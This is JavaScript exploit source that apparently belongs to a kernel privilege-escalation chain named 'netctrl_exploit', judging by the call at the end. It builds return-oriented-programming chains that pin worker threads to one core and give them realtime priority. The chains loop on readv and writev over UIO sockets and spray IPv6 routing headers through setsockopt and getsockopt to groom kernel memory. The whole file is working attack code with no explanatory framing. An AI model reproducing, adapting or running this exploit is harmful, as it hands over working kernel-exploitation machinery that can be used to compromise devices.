function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovWrite);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(readv_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_1));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovRead);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(writev_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // Spray all sockets
  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[i]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)); // Offset for socket i

    // debug("");
    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));

    rop.push(gadgets.POP_R8_RET);
    rop.push(new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }

  // After spraying, read all sockets into buffer array
  for (var _i15 = 0; _i15 < ipv6_socks.length; _i15++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[_i15]);
    // debug("");
    // debug("pushed sock: " + hex(ipv6_socks[i]));
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(read_rthdr_rop.add(_i15 * 8)); // Offset for socket i
    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
    rop.push(gadgets.POP_R8_RET);
    rop.push(check_len);
    rop.push(getsockopt_wrapper);
  }

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  // Exit
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(0));
  rop.push(thr_exit_wrapper);

  // It's gonna loop

  return {
    rop,
    loop_size: 0 // loop_size
  };
}
netctrl_exploit();
// cleanup();